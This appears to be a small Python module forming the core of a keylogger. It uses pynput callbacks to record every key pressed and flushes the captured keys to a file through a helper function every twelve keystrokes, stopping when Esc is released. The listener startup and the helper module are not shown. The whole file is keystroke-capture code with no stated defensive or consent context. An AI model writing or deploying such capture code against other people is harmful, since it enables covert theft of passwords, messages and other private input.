from pynput.keyboard import Key

from helpers import write_to_file

keys = []
char_count = 0

def key_press(key):
	global keys, char_count
	MAX_COUNT = 12

	keys.append(key)
	char_count += 1

	if char_count >= MAX_COUNT:
		write_to_file(keys)
		char_count = 0
		keys = []

def key_release(key):
	if key == Key.esc:
		return False
